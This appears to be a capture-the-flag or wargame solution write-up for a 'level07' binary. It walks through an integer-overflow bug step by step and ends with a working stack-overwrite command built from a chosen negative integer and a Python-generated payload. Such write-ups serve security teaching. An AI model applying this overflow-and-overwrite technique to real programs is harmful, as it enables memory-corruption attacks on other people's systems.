@@ -1,0 +1,100 @@
+1.) Program takes an int that must be less than 10 and multiplies it by sizeof(int) to write to a buffer.
+    - The multiplcation is going to be propigated to unsigned integer math.  We need a negative number that will
+      overflow the unsigned integer to be a value that is enough to write the value of the stack value to the exact value
+
+2.) The buffer we are writing from until we hit the local count variable is 60 bytes away.
+    - p/d ($ebp -0x48) - ($ebp-0xc) = 60
+
+3.) Determine a value that gives us at least 64 bytes of buffer size to write, starting at 60 we will write the last four bytes
+    as whatever the program expects count to be to win
+    
+    Write simple test app to just figure it out for us:
+
+    #include <iostream>
+
+    using namespace std;
+
+    int main(int argc, char** argv) {
+        int i = 10;
+        for(; i <= 10; --i) {
+            unsigned int t = sizeof(int) * i;
+            if (t < 100)
+                cout << "Integer " << i << " gives buffer size of: " << t << endl;
+        }
+    }
+
+
+RESULT:
+nteger 10 gives buffer size of: 40
+Integer 9 gives buffer size of: 36
+Integer 8 gives buffer size of: 32
+Integer 7 gives buffer size of: 28
+Integer 6 gives buffer size of: 24
+Integer 5 gives buffer size of: 20
+Integer 4 gives buffer size of: 16
+Integer 3 gives buffer size of: 12
+Integer 2 gives buffer size of: 8
+Integer 1 gives buffer size of: 4
+Integer 0 gives buffer size of: 0
+Integer -1073741800 gives buffer size of: 96
+Integer -1073741801 gives buffer size of: 92
+Integer -1073741802 gives buffer size of: 88
+Integer -1073741803 gives buffer size of: 84
+Integer -1073741804 gives buffer size of: 80
+Integer -1073741805 gives buffer size of: 76
+Integer -1073741806 gives buffer size of: 72
+Integer -1073741807 gives buffer size of: 68
+Integer -1073741808 gives buffer size of: 64
+Integer -1073741809 gives buffer size of: 60
+Integer -1073741810 gives buffer size of: 56
+Integer -1073741811 gives buffer size of: 52
+Integer -1073741812 gives buffer size of: 48
+Integer -1073741813 gives buffer size of: 44
+Integer -1073741814 gives buffer size of: 40
+Integer -1073741815 gives buffer size of: 36
+Integer -1073741816 gives buffer size of: 32
+Integer -1073741817 gives buffer size of: 28
+Integer -1073741818 gives buffer size of: 24
+Integer -1073741819 gives buffer size of: 20
+Integer -1073741820 gives buffer size of: 16
+Integer -1073741821 gives buffer size of: 12
+Integer -1073741822 gives buffer size of: 8
+Integer -1073741823 gives buffer size of: 4
+Integer -1073741824 gives buffer size of: 0
+Integer -2147483624 gives buffer size of: 96
+Integer -2147483625 gives buffer size of: 92
+Integer -2147483626 gives buffer size of: 88
+Integer -2147483627 gives buffer size of: 84
+Integer -2147483628 gives buffer size of: 80
+Integer -2147483629 gives buffer size of: 76
+Integer -2147483630 gives buffer size of: 72
+Integer -2147483631 gives buffer size of: 68
+=> Integer -2147483632 gives buffer size of: 64
+Integer -2147483633 gives buffer size of: 60
+Integer -2147483634 gives buffer size of: 56
+Integer -2147483635 gives buffer size of: 52
+Integer -2147483636 gives buffer size of: 48
+Integer -2147483637 gives buffer size of: 44
+Integer -2147483638 gives buffer size of: 40
+Integer -2147483639 gives buffer size of: 36
+Integer -2147483640 gives buffer size of: 32
+Integer -2147483641 gives buffer size of: 28
+Integer -2147483642 gives buffer size of: 24
+Integer -2147483643 gives buffer size of: 20
+Integer -2147483644 gives buffer size of: 16
+Integer -2147483645 gives buffer size of: 12
+Integer -2147483646 gives buffer size of: 8
+Integer -2147483647 gives buffer size of: 4
+Integer -2147483648 gives buffer size of: 0
+Integer -1073741809 gives buffer size of: 60
+
+
+4.) Ok, so our input is: -2147483632
+
+5.) Our buffer can just be 60 'A' and then the 4byte value: 0x574f4c46 as required by the source code.  (Remember to write it onto the buffer backwards!)
+    - python -c "print('A'*60 + '\x57\x4f\x4c\x46'[::-1])"
+
+6.) Putting it all together, this gives us our final solution:
+    - /levels/level07 -2147483632 `python -c "print('A'*60 + '\x57\x4f\x4c\x46'[::-1])"`
+
+
